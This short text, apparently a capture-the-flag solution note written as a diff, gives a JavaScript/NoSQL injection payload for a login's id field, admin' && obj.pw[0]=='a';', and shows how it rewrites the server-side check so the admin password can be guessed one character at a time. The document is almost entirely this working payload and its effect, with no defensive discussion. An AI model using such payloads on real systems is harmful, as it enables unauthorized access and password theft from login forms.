@@ -1,0 +1,11 @@
+admin' && obj.pw[0]=='a';'
+
+Just admin' && obj.pw[0]=='a';'put in id .
+Then after injection
+
+function () {
+    return obj.id =='admin' && obj.pw [0] =='a';
+    '' && obj.pw =='';
+}
+
+:)
